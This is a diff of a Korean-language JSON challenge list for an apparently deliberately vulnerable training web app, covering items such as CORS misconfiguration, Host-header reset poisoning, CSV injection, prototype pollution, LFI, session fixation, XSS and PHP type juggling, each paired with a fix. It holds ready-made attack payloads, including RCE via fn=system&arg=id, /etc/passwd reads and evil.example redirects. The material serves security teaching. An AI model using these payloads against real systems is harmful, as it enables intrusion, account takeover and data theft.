       "ref": "https://portswigger.net/web-security/cors",
       "goal": "Origin을 그대로 반사하고 credentials를 허용해 타 사이트가 인증 데이터를 읽는다.",
       "route": "/api/user_data",
       "steps": [
-        { "desc": "임의 Origin 반사 확인", "payload": "Origin: https://evil.example  →  ACAO: https://evil.example, ACAC: true" }
+        {
+          "desc": "임의 Origin 반사 확인",
+          "payload": "Origin: https://evil.example  →  ACAO: https://evil.example, ACAC: true"
+        }
       ],
       "fix": "Origin 화이트리스트, credentials 허용 시 와일드카드/반사 금지."
     },
     {
-      "id": 25, "category": "adv", "difficulty": "medium",
+      "id": 25,
+      "category": "adv",
+      "difficulty": "medium",
       "title": "비즈니스 로직 — 상점 가격/수량 조작",
       "owasp": "A04:2021 Insecure Design",
       "ref": "https://owasp.org/Top10/A04_2021-Insecure_Design/",
       "goal": "구매 요청의 가격/수량/합계를 클라이언트가 조작해 포인트를 적게/음수로 결제.",
       "route": "/shop/buy",
       "steps": [
-        { "desc": "가격 조작", "payload": "product_id=3&quantity=1&unit_price=0" },
-        { "desc": "음수 수량으로 포인트 증가", "payload": "product_id=3&quantity=-100" }
+        {
+          "desc": "가격 조작",
+          "payload": "product_id=3&quantity=1&unit_price=0"
+        },
+        {
+          "desc": "음수 수량으로 포인트 증가",
+          "payload": "product_id=3&quantity=-100"
+        }
       ],
       "fix": "가격/합계는 서버에서 재계산. 수량 범위 검증, 트랜잭션·재고 확인."
     },
     {
-      "id": 26, "category": "auth", "difficulty": "hard",
+      "id": 26,
+      "category": "auth",
+      "difficulty": "hard",
       "title": "Host 헤더 인젝션 — 비밀번호 재설정 포이즈닝",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://portswigger.net/web-security/host-header",
       "goal": "재설정 링크 생성에 Host 헤더를 신뢰해 공격자 도메인이 포함된 링크가 발급된다.",
       "route": "/find_pw",
       "steps": [
-        { "desc": "요청 Host 변조", "payload": "Host: evil.example  →  재설정 링크: http://evil.example/reset?token=..." }
+        {
+          "desc": "요청 Host 변조",
+          "payload": "Host: evil.example  →  재설정 링크: http://evil.example/reset?token=..."
+        }
       ],
       "fix": "신뢰 호스트 화이트리스트/고정 도메인으로 링크 생성. Host 헤더 미신뢰."
     },
     {
-      "id": 27, "category": "adv", "difficulty": "easy",
+      "id": 27,
+      "category": "adv",
+      "difficulty": "easy",
       "title": "클릭재킹 (X-Frame-Options 누락)",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://owasp.org/www-community/attacks/Clickjacking",
       "goal": "프레임 차단 헤더가 없어 iframe에 올려 UI 리드레싱이 가능함을 확인.",
       "route": "/ (전체)",
       "steps": [
-        { "desc": "iframe 삽입 테스트", "payload": "<iframe src=\"http://127.0.0.1:8101/\"></iframe>" }
+        {
+          "desc": "iframe 삽입 테스트",
+          "payload": "<iframe src=\"http://127.0.0.1:8101/\"></iframe>"
+        }
       ],
       "fix": "X-Frame-Options: DENY 또는 CSP frame-ancestors 'none'."
     },
     {
-      "id": 28, "category": "adv", "difficulty": "medium",
+      "id": 28,
+      "category": "adv",
+      "difficulty": "medium",
       "title": "보안 설정 오류 / 민감정보·디버그 노출",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
       "goal": "verbose 에러, 디버그 라우트, 소스/설정 노출로 내부 정보를 수집.",
       "route": "/debug, 에러 페이지",
       "steps": [
-        { "desc": "에러 유발로 스택/쿼리 노출", "payload": "잘못된 입력 → DB 오류/쿼리 그대로 표시" },
-        { "desc": "디버그 라우트", "payload": "/debug 또는 /api/user_data (키 노출)" }
+        {
+          "desc": "에러 유발로 스택/쿼리 노출",
+          "payload": "잘못된 입력 → DB 오류/쿼리 그대로 표시"
+        },
+        {
+          "desc": "디버그 라우트",
+          "payload": "/debug 또는 /api/user_data (키 노출)"
+        }
       ],
       "fix": "운영 환경 디버그 off, 일반화된 오류, 디버그 라우트 제거, 비밀값 분리."
     },
     {
-      "id": 29, "category": "adv", "difficulty": "medium",
+      "id": 29,
+      "category": "adv",
+      "difficulty": "medium",
       "title": "CSV / 수식 인젝션 (Formula Injection)",
       "owasp": "A03:2021 Injection",
       "ref": "https://owasp.org/www-community/attacks/CSV_Injection",
       "goal": "내보내기 CSV에 =,+,-,@ 로 시작하는 값을 넣어 스프레드시트에서 수식이 실행되게 한다.",
       "route": "/admin/export.csv",
       "steps": [
-        { "desc": "닉네임/글에 수식 삽입 후 내보내기", "payload": "=1+1  또는  =HYPERLINK(\"http://evil\",\"click\")" }
+        {
+          "desc": "닉네임/글에 수식 삽입 후 내보내기",
+          "payload": "=1+1  또는  =HYPERLINK(\"http://evil\",\"click\")"
+        }
       ],
       "fix": "셀 값 앞에 ' 또는 공백 접두, 위험 접두문자 이스케이프."
     },
     {
-      "id": 30, "category": "adv", "difficulty": "expert", "engine": "node",
+      "id": 30,
+      "category": "adv",
+      "difficulty": "expert",
+      "engine": "node",
       "title": "프로토타입 오염 (Prototype Pollution · Node 전용)",
       "owasp": "A08:2021 Software and Data Integrity Failures",
       "ref": "https://portswigger.net/web-security/prototype-pollution",
       "goal": "JSON 병합 로직이 __proto__ 키를 거르지 않아 Object.prototype이 오염된다.",
       "route": "/api/merge (Node 엔진)",
       "steps": [
-        { "desc": "프로토타입에 속성 주입", "payload": "{\"__proto__\":{\"isAdmin\":true}}" }
+        {
+          "desc": "프로토타입에 속성 주입",
+          "payload": "{\"__proto__\":{\"isAdmin\":true}}"
+        }
       ],
       "fix": "__proto__/constructor/prototype 키 차단, Map 사용, Object.create(null), 안전한 merge 라이브러리."
     },
     {
-      "id": 31, "category": "file", "difficulty": "hard",
+      "id": 31,
+      "category": "file",
+      "difficulty": "hard",
       "title": "LFI — 로컬 파일 포함 (include)",
       "owasp": "A03:2021 Injection / Path Traversal",
       "ref": "https://owasp.org/www-community/attacks/Path_Traversal",
       "goal": "테마/페이지 이름 파라미터가 그대로 include 되어 임의 로컬 파일/소스가 실행·노출된다.",
       "route": "/theme?name=",
       "steps": [
-        { "desc": "소스 노출/상위 경로", "payload": "/theme?name=../lib" },
-        { "desc": "업로드한 웹셸 포함", "payload": "/theme?name=../uploads/shell" }
+        {
+          "desc": "소스 노출/상위 경로",
+          "payload": "/theme?name=../lib"
+        },
+        {
+          "desc": "업로드한 웹셸 포함",
+          "payload": "/theme?name=../uploads/shell"
+        }
       ],
-      "fix": "include 대상 화이트리스트, 사용자 입력으로 경로 조립 금지."
+      "fix": "include 대상 화이트리스트, 사용자 입력으로 경로 조립 금지.",
+      "diagram": "include <입력>\n  name=php://filter/convert.base64-encode/resource=lib.php → 소스 base64 노출\n  name=/etc/passwd                                         → 파일 내용 노출\n  name=uploads/shell.php                                   → 코드 실행(RCE)"
     },
     {
-      "id": 32, "category": "auth", "difficulty": "medium",
+      "id": 32,
+      "category": "auth",
+      "difficulty": "medium",
       "title": "세션 고정 (Session Fixation)",
       "owasp": "A07:2021 Identification and Authentication Failures",
       "ref": "https://owasp.org/www-community/attacks/Session_fixation",
       "goal": "로그인 시 세션 ID를 재발급하지 않아, 미리 심어둔 세션으로 인증 상태를 탈취할 수 있다.",
       "route": "/login",
       "steps": [
-        { "desc": "피해자에게 고정 세션 쿠키 심기 → 로그인 후에도 동일 ID 유지", "payload": "Cookie: PHPSESSID=attacker_fixed_id" }
+        {
+          "desc": "피해자에게 고정 세션 쿠키 심기 → 로그인 후에도 동일 ID 유지",
+          "payload": "Cookie: PHPSESSID=attacker_fixed_id"
+        }
       ],
       "fix": "로그인 성공 시 세션 ID 재발급(session_regenerate_id), 로그아웃 시 폐기."
     },
     {
-      "id": 33, "category": "auth", "difficulty": "easy",
+      "id": 33,
+      "category": "auth",
+      "difficulty": "easy",
       "title": "쿠키 보안 속성 누락 (HttpOnly/Secure/SameSite)",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://owasp.org/www-community/controls/SecureCookieAttribute",
       "goal": "인증 쿠키에 HttpOnly/SameSite 가 없어 XSS 로 탈취·CSRF 에 악용된다.",
       "route": "- (응답 Set-Cookie 확인)",
       "steps": [
-        { "desc": "개발자도구에서 role/jwt_token 쿠키 속성 확인", "payload": "document.cookie 로 접근 가능 → HttpOnly 없음" }
+        {
+          "desc": "개발자도구에서 role/jwt_token 쿠키 속성 확인",
+          "payload": "document.cookie 로 접근 가능 → HttpOnly 없음"
+        }
       ],
       "fix": "HttpOnly+Secure+SameSite 설정, 민감 쿠키는 서버 세션으로."
     },
     {
-      "id": 34, "category": "adv", "difficulty": "easy",
+      "id": 34,
+      "category": "adv",
+      "difficulty": "easy",
       "title": "보안 헤더 누락 (nosniff/CSP/HSTS/Referrer)",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://owasp.org/www-project-secure-headers/",
       "goal": "X-Content-Type-Options·CSP·HSTS 등 방어 헤더가 없어 XSS/스니핑 영향이 커진다.",
       "route": "- (응답 헤더 확인)",
       "steps": [
-        { "desc": "응답 헤더 점검", "payload": "curl -I 로 CSP/X-Content-Type-Options 부재 확인" }
+        {
+          "desc": "응답 헤더 점검",
+          "payload": "curl -I 로 CSP/X-Content-Type-Options 부재 확인"
+        }
       ],
       "fix": "CSP, X-Content-Type-Options:nosniff, Referrer-Policy, HSTS 적용."
     },
     {
-      "id": 35, "category": "xss", "difficulty": "hard",
+      "id": 35,
+      "category": "xss",
+      "difficulty": "hard",
       "title": "저장형 XSS via User-Agent (관리자 로그 화면)",
       "owasp": "A03:2021 Injection (XSS)",
       "ref": "https://portswigger.net/web-security/cross-site-scripting/stored",
       "goal": "로그인 시 User-Agent 가 로그에 저장되고 관리자 로그 화면에서 그대로 렌더되어, 공격자가 관리자 세션을 노린다.",
       "route": "/login → /admin (로그)",
       "steps": [
-        { "desc": "악성 UA 로 로그인 시도", "payload": "User-Agent: <img src=x onerror=alert('admin-xss')>" }
+        {
+          "desc": "악성 UA 로 로그인 시도",
+          "payload": "User-Agent: <img src=x onerror=alert('admin-xss')>"
+        }
       ],
       "fix": "로그 출력 시 이스케이프, 관리 화면도 신뢰하지 말 것."
     },
     {
-      "id": 36, "category": "auth", "difficulty": "medium",
+      "id": 36,
+      "category": "auth",
+      "difficulty": "medium",
       "title": "수평 권한 상승 — 타인 글 수정/삭제",
       "owasp": "A01:2021 Broken Access Control",
       "ref": "https://portswigger.net/web-security/access-control",
       "goal": "게시글 수정/삭제가 로그인 여부만 확인하고 소유자 검증을 하지 않아 남의 글을 조작한다.",
       "route": "/post/<id>/edit, /post/<id>/delete",
       "steps": [
-        { "desc": "다른 사용자의 글 id 로 직접 요청", "payload": "POST /post/1/delete (내 글이 아님)" }
+        {
+          "desc": "다른 사용자의 글 id 로 직접 요청",
+          "payload": "POST /post/1/delete (내 글이 아님)"
+        }
       ],
       "fix": "작성자(author_id)==현재 사용자 또는 관리자만 허용하는 서버측 검증."
     },
     {
-      "id": 37, "category": "auth", "difficulty": "easy",
+      "id": 37,
+      "category": "auth",
+      "difficulty": "easy",
       "title": "오픈 리다이렉트 — 로그인 next 파라미터",
       "owasp": "A01:2021 Broken Access Control",
       "ref": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
       "goal": "로그인 후 이동할 next 값이 검증되지 않아 외부 피싱 사이트로 유도된다.",
       "route": "/login?next=",
       "steps": [
-        { "desc": "외부 URL 지정", "payload": "/login?next=https://evil.example" }
+        {
+          "desc": "외부 URL 지정",
+          "payload": "/login?next=https://evil.example"
+        }
       ],
       "fix": "next 는 내부 상대경로만 허용(화이트리스트)."
     },
     {
-      "id": 38, "category": "file", "difficulty": "medium",
+      "id": 38,
+      "category": "file",
+      "difficulty": "medium",
       "title": "위험 파일 업로드 — HTML/SVG 저장형 XSS",
       "owasp": "A05:2021 / Unrestricted Upload",
       "ref": "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
       "goal": "HTML/SVG 를 업로드하고 직접 접근하면 스크립트가 같은 오리진에서 실행된다.",
       "route": "/post/write → /uploads/<file>",
       "steps": [
-        { "desc": "evil.svg 업로드 후 접근", "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>" }
+        {
+          "desc": "evil.svg 업로드 후 접근",
+          "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>"
+        }
       ],
       "fix": "업로드 콘텐츠 타입 제한, 다운로드 강제(Content-Disposition), 별도 오리진 서빙."
     },
     {
-      "id": 39, "category": "adv", "difficulty": "hard",
+      "id": 39,
+      "category": "adv",
+      "difficulty": "hard",
       "title": "경쟁 조건 (Race Condition) — 상점 중복 결제/적립",
       "owasp": "A04:2021 Insecure Design",
       "ref": "https://portswigger.net/web-security/race-conditions",
       "goal": "잔액 확인과 차감 사이에 원자성이 없어 동시 요청으로 한도를 초과 사용/적립한다.",
       "route": "/shop/buy (동시 요청)",
       "steps": [
-        { "desc": "같은 구매를 병렬로 다수 전송", "payload": "for i in 1..20: POST /shop/buy (동시)" }
+        {
+          "desc": "같은 구매를 병렬로 다수 전송",
+          "payload": "for i in 1..20: POST /shop/buy (동시)"
+        }
       ],
       "fix": "트랜잭션+행 잠금, 원자적 조건부 UPDATE, 멱등 키."
     },
     {
-      "id": 40, "category": "adv", "difficulty": "expert",
+      "id": 40,
+      "category": "adv",
+      "difficulty": "expert",
       "title": "민감정보 하드코딩 / 소스 노출",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://cwe.mitre.org/data/definitions/798.html",
       "goal": "소스에 JWT 시크릿·API 키가 하드코딩되어 LFI/경로탐색으로 유출 시 전면 위조가 가능하다.",
       "route": "/download?file=../lib.php, /theme?name=../lib",
       "steps": [
-        { "desc": "소스 확보 후 시크릿 추출", "payload": "JWT_SECRET='secret' → 관리자 토큰 위조" }
+        {
+          "desc": "소스 확보 후 시크릿 추출",
+          "payload": "JWT_SECRET='secret' → 관리자 토큰 위조"
+        }
       ],
       "fix": "비밀값은 환경변수/시크릿 매니저로 분리, 소스 노출 경로 차단."
     },
     {
-      "id": 41, "category": "auth", "difficulty": "medium", "engine": "php",
+      "id": 41,
+      "category": "auth",
+      "difficulty": "medium",
+      "engine": "php",
       "title": "PHP 타입 저글링 — 매직 해시 (loose ==)",
       "owasp": "A07:2021 Identification and Authentication Failures",
       "ref": "https://www.php.net/manual/en/types.comparisons.php",
       "goal": "느슨한 비교(==)에서 '0e[숫자]' 형태 해시가 0으로 취급되는 점을 이용해 토큰 검증을 우회한다.",
       "route": "/verify_token",
       "steps": [
-        { "desc": "매직 해시 문자열 입력(md5가 0e… 형태)", "payload": "240610708  (md5=0e462097431906509019562988736854)" }
+        {
+          "desc": "매직 해시 문자열 입력(md5가 0e… 형태)",
+          "payload": "240610708  (md5=0e462097431906509019562988736854)"
+        }
       ],
-      "fix": "항상 strict 비교(===)와 hash_equals() 사용, 숫자형 자동변환 금지."
+      "fix": "항상 strict 비교(===)와 hash_equals() 사용, 숫자형 자동변환 금지.",
+      "detail": "PHP 의 느슨한 비교(==)는 '0e[숫자]' 형태 문자열을 과학적 표기의 0 으로 형변환합니다. 서로 다른 매직 해시라도 둘 다 0 이 되어 동등 비교가 참이 됩니다.",
+      "diagram": "md5(\"240610708\") = 0e4620…     저장값 = 0e8304…( = md5 \"QNKCDZO\")\n느슨한 비교:  \"0e4620…\" == \"0e8304…\"  →  0 == 0  →  true\n해결: 항상 ===(엄격 비교)와 hash_equals() 사용"
     },
     {
-      "id": 42, "category": "auth", "difficulty": "medium", "engine": "php",
+      "id": 42,
+      "category": "auth",
+      "difficulty": "medium",
+      "engine": "php",
       "title": "extract() 변수 주입",
       "owasp": "A08:2021 Software and Data Integrity Failures",
       "ref": "https://www.php.net/manual/en/function.extract.php",
       "goal": "사용자 입력 배열을 extract() 로 전개해 인증/권한 플래그 변수를 덮어쓴다.",
       "route": "/settings",
       "steps": [
-        { "desc": "권한 플래그 변수 덮어쓰기", "payload": "/settings?is_admin=1" }
+        {
+          "desc": "권한 플래그 변수 덮어쓰기",
+          "payload": "/settings?is_admin=1"
+        }
       ],
       "fix": "신뢰 불가 입력에 extract() 금지. 필요한 키만 명시적으로 읽기."
     },
     {
-      "id": 43, "category": "file", "difficulty": "expert", "engine": "php",
+      "id": 43,
+      "category": "file",
+      "difficulty": "expert",
+      "engine": "php",
       "title": "변수 함수 (Dynamic Call) — 임의 함수 실행",
       "owasp": "A03:2021 Injection",
       "ref": "https://www.php.net/manual/en/functions.variable-functions.php",
       "goal": "사용자 입력을 함수명으로 쓰는 변수 함수 호출($fn())로 임의 PHP 함수를 실행(RCE)한다.",
       "route": "/api/call?fn=&arg=",
       "steps": [
-        { "desc": "명령 실행", "payload": "/api/call?fn=system&arg=id" },
-        { "desc": "파일 읽기", "payload": "/api/call?fn=file_get_contents&arg=/etc/passwd" }
+        {
+          "desc": "명령 실행",
+          "payload": "/api/call?fn=system&arg=id"
+        },
+        {
+          "desc": "파일 읽기",
+          "payload": "/api/call?fn=file_get_contents&arg=/etc/passwd"
+        }
       ],
-      "fix": "사용자 입력을 함수명으로 사용 금지. 허용 함수 화이트리스트/분기문 사용."
+      "fix": "사용자 입력을 함수명으로 사용 금지. 허용 함수 화이트리스트/분기문 사용.",
+      "diagram": "$fn = $_GET['fn'];  $fn($_GET['arg']);\n  fn=system            & arg=id          → system('id')         (명령 실행)\n  fn=file_get_contents & arg=/etc/passwd → 임의 파일 읽기"
     },
     {
-      "id": 44, "category": "adv", "difficulty": "easy", "engine": "php",
+      "id": 44,
+      "category": "adv",
+      "difficulty": "easy",
+      "engine": "php",
       "title": "phpinfo() 정보 노출",
       "owasp": "A05:2021 Security Misconfiguration",
       "ref": "https://owasp.org/www-project-web-security-testing-guide/",
       "goal": "운영 환경에 노출된 phpinfo() 로 경로·확장·환경변수 등 내부 정보를 수집한다.",
       "route": "/phpinfo",
       "steps": [
-        { "desc": "직접 접근", "payload": "/phpinfo" }
+        {
+          "desc": "직접 접근",
+          "payload": "/phpinfo"
+        }
       ],
       "fix": "phpinfo() 등 진단 페이지를 운영에서 제거/차단."
     }
